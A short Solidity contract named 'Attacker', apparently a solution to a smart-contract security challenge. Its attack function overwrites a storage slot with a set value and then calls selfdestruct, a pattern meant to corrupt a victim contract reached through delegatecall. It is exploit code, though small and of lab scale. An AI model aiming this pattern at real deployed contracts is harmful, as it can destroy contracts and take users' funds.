pragma solidity ^0.8.13;

contract Attacker {
    uint256 dummy;
    uint256 horsePower;
    function attack() public {
        horsePower = 1717;
        selfdestruct(payable(msg.sender));
    }
}